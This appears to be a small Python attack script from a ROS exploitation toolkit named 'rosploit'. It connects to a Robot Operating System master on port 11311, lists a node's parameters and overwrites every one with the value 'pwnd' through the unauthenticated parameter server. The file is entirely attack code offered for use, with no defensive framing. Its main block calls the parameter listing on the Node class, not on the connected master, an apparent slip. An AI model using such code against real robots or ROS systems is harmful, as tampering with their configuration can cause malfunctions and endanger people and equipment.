from core import Node


def change_parameter(master: Node, node_name: str, param_name: str, new_value: str):
    """
    Change a paramter in the paramter server
    :param master: A node object for the ROS master node
    :param node_name: The name to give the node to request information
    :param param_name: The name of the paramter you want to change
    :param new_value: The new value of the parameter
    :return:
    """
    master.server.setParam(node_name, param_name, new_value)


if __name__ == "__main__":
    master = Node(ip_addr='localhost', port="11311", notes="Master Node")
    new_value = "pwnd"
    node_name = "/rosploit"
    (_, _, param_list) = Node.server.getParamNames(node_name)
    for param_name in param_list:
        change_parameter(master, node_name, param_name, new_value)
